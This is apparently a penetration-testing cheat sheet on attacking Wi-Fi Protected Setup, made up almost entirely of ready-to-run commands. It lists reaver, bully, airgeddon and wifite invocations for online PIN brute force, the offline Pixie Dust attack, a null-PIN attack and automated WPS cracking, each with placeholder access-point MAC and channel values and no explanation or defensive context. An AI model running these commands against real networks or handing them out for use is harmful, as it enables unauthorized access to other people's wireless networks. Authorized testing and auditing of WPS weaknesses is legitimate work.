# WPS (Wi-Fi Protected Setup) Attacks

## Known PINs + Generation Algorithms

```bash
airgeddon.sh  # Known PINs database based attack
```

## WPS PIN Bruteforce (online)

```bash
reaver -i mon0 -b <MAC_AP> -c <channel> -f -N -L -d 2 -vv
bully mon0 -b <MAC_AP> -c <channel> -S -F -B -v 3
```

## WPS Pixie Dust Attack (offline)

```bash
reaver -i mon0 -b <MAC_AP> -c <channel> -K -N -vv
bully mon0 -b <MAC_AP> -d -v 3
```

## Null PIN Attack

```bash
reaver -i mon0 -b <MAC_AP> -c <channel> -f -N -g 1 -vv -p ""
```

## WPS PIN Attack Automated

```bash
wifite --wps-only [--bully]
```
